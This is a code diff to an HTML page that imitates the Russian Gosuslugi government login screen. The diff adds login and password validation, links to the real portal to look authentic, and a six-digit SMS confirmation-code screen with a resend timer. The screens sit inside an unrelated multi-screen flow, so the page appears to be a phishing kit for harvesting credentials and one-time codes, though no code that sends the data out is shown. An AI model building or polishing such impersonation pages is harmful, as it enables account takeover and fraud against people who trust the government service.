@@ -86,17 +86,21 @@
   <!-- Новый экран Госуслуги в общем стиле -->
   <div class="container" id="screen6">
     <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
-      <span style="color:#2563eb;">Гос</span><span style="color:#ef4444;">услуги</span>
+      <span style="color:#2563eb;">гос</span><span style="color:#ef4444;">услуги</span>
     </h1>
     <div style="margin-bottom: 16px;">
-      <input type="text" class="input" placeholder="Телефон / Email / СНИЛС" style="margin-bottom: 12px;" />
-      <input type="password" class="input" placeholder="Пароль" style="margin-bottom: 8px;" />
-      <div style="margin-bottom: 20px; text-align:right;">
-        <span style="color:#2563eb; cursor:pointer; font-size:15px;">Восстановить</span>
+      <input type="text" class="input" id="loginInput" placeholder="Телефон / Email / СНИЛС" style="margin-bottom: 12px;" />
+      <div id="loginError" style="color:#ef4444; font-size:13px; margin-bottom:6px; display:none;"></div>
+      <input type="password" class="input" id="passwordInput" placeholder="Пароль" style="margin-bottom: 8px;" />
+      <div id="passwordError" style="color:#ef4444; font-size:13px; margin-bottom:6px; display:none;"></div>
+      <div style="margin-bottom: 20px; text-align:left;">
+        <a href="https://esia.gosuslugi.ru/login/recovery" target="_blank" style="color:#2563eb; cursor:pointer; font-size:15px; text-decoration:none;">
+          Восстановить
+        </a>
       </div>
-      <button class="blue" onclick="nextScreen(7)">Войти</button>
+      <button class="blue" onclick="validateLoginForm()" style="font-weight:bold;">Войти</button>
       <div style="margin-top: 10px; text-align:center;">
-        <span style="color:#2563eb; cursor:pointer; font-size:15px;">Зарегистрироваться</span>
+        <a href="https://esia.gosuslugi.ru/login/recovery" target="_blank" style=" color:#2563eb; cursor:pointer; font-size:15px; text-decoration:none;">Зарегистрироваться</a>
       </div>
     </div>
   </div>
@@ -107,18 +111,21 @@
       <span style="color:#2563eb;">гос</span><span style="color:#ef4444;">услуги</span>
     </h1>
     <div style="margin-bottom: 18px; text-align:center;">
-      <div style="font-size: 18px; margin-bottom: 8px;">Подтвердите вход по СМС</div>
+      <div style="font-size: 18px; margin-bottom: 8px; font-weight: bold;">Подтвердите вход по СМС</div>
       <div style="font-size: 15px; color: #6b7280; margin-bottom: 18px;">Код подтверждения отправлен на телефон</div>
-      <div id="code-inputs" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 18px;">
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
-        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+      <div id="code-inputs" style="display: flex; justify-content: center; gap: 6px; margin-bottom: 18px;">
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 48px; height: 56px; text-align: center; font-size: 28px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6; color: #111827; padding: 0 6px; line-height: 56px; font-family: Arial, sans-serif;" />
       </div>
-      <div style="font-size: 15px; color: #2563eb; margin-bottom: 18px;">
-        Отправить повторно через <span id="sms-timer">60</span> секунд
+      <div style="font-size: 15px; margin-bottom: 18px;">
+        <span id="sms-timer-block" style="color: #6b7280;">
+          Отправить повторно через <span id="sms-timer" style="font-weight:bold; color:#111827;">00:00</span>
+        </span>
+        <span id="sms-resend" style="display:none; font-weight:bold; color:#2563eb; cursor:pointer;">Отправить код снова</span>
       </div>
       <div style="margin-bottom: 8px;">
         <span style="color:#2563eb; cursor:pointer; font-size:15px;">Не могу подтвердить вход</span>
@@ -142,6 +149,7 @@
 
   <script>
     let userStatus = '';
+    let smsTimerInterval = null;
 
     function nextScreen(screenNumber) {
       document.querySelectorAll('.container').forEach(el => el.style.display = 'none');
@@ -178,16 +186,29 @@
     }
 
     function startSMSTimer() {
+      // Остановить предыдущий таймер, если был
+      if (smsTimerInterval) {
+        clearInterval(smsTimerInterval);
+        smsTimerInterval = null;
+      }
       let timer = 60;
       const timerSpan = document.getElementById('sms-timer');
-      if (!timerSpan) return;
-      timerSpan.textContent = timer;
-      const interval = setInterval(() => {
+      const timerBlock = document.getElementById('sms-timer-block');
+      const resendBtn = document.getElementById('sms-resend');
+      if (!timerSpan || !timerBlock || !resendBtn) return;
+      timerBlock.style.display = '';
+      resendBtn.style.display = 'none';
+      timerSpan.textContent = '01:00';
+      smsTimerInterval = setInterval(() => {
         timer--;
-        timerSpan.textContent = timer;
+        let min = String(Math.floor(timer / 60)).padStart(2, '0');
+        let sec = String(timer % 60).padStart(2, '0');
+        timerSpan.textContent = `${min}:${sec}`;
         if (timer <= 0) {
-          clearInterval(interval);
-          timerSpan.textContent = '0';
+          clearInterval(smsTimerInterval);
+          smsTimerInterval = null;
+          timerBlock.style.display = 'none';
+          resendBtn.style.display = '';
         }
       }, 1000);
     }
@@ -222,6 +243,48 @@
       });
       // Фокус на первое поле
       if (inputs.length) inputs[0].focus();
+    }
+
+    // Валидация логина и пароля на экране Госуслуги
+    function validateLoginForm() {
+      const login = document.getElementById('loginInput').value.trim();
+      const password = document.getElementById('passwordInput').value;
+      const loginError = document.getElementById('loginError');
+      const passwordError = document.getElementById('passwordError');
+      let valid = true;
+
+      // Сброс ошибок
+      loginError.style.display = 'none';
+      passwordError.style.display = 'none';
+      loginError.textContent = '';
+      passwordError.textContent = '';
+
+      // Проверка логина
+      if (!login) {
+        loginError.textContent = 'Введите логин';
+        loginError.style.display = 'block';
+        valid = false;
+      }
+
+      // Проверка длины пароля
+      if (password.length < 6) {
+        passwordError.textContent = 'Пароль должен быть не менее 6 символов';
+        passwordError.style.display = 'block';
+        valid = false;
+      }
+
+      // Проверка пароля на спецсимвол
+      // Любой символ кроме латиницы, кириллицы и цифр
+      const specialChar = /[^a-zA-Zа-яА-Я0-9]/;
+      if (!specialChar.test(password)) {
+        passwordError.textContent = 'Пароль должен содержать хотя бы один специальный символ';
+        passwordError.style.display = 'block';
+        valid = false;
+      }
+
+      if (valid) {
+        nextScreen(7);
+      }
     }
   </script>
 </body>
